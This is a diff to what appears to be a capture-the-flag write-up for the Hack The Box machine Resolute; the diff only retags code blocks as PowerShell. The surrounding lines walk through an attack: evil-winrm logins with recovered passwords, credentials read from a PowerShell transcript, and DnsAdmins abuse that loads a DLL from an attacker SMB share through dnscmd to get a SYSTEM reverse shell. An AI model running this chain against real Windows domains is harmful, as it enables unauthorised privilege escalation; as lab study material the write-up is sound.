@@ -155,7 +155,7 @@ evil-winrm -i 10.10.10.169 -p Welcome123! -u melanie
 
 Awesome! I was now able to log into the machine. Now, I began enumerating the box manually. I found that in the root of C:\, there was a PSTranscripts directory. Enumerating within this directory, I discovered another set of credentials:
 
-{% highlight bash linenos %}
+{% highlight powershell linenos %}
 cat C:\PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.
 20191203063201.txt
 
@@ -177,7 +177,7 @@ evil-winrm -i 10.10.10.169 -p Serv3r4Admin4cc123! -u ryan
 
 Again, I began to manually enumerate the machine. I began by looking over what rights I had as this user, and by running a simple `whoami /all` command, I discovered I was a part of a very interesting group:
 
-{% highlight bash linenos %}
+{% highlight powershell linenos %}
 *Evil-WinRM* PS C:\Users\ryan\Documents> whoami /all
 
 ...
@@ -208,20 +208,20 @@ nc -nlvp 9001
 
 I then used dnscmd.exe on Resolute to setup the config to run my malicious DLL, thus returning a privileged shell:
 
-{% highlight bash linenos %}
+{% highlight powershell linenos %}
 *Evil-WinRM* PS C:\Windows> dnscmd.exe /config /serverlevelplugindll \\10.10.14.13\\test\\shell.dll
 {% endhighlight %}
 
 All I needed to do was call the Resolute machine to stop and start the process:
 
-{% highlight bash linenos %}
+{% highlight powershell linenos %}
 *Evil-WinRM* PS C:\Windows> sc.exe stop dns
 *Evil-WinRM* PS C:\Windows> sc.exe start dns
 {% endhighlight %}
 
 And I got a return on my nc listener:
 
-{% highlight bash linenos %}
+{% highlight powershell linenos %}
 C:\Windows\system32>whoami
 whoami
 nt authority\system
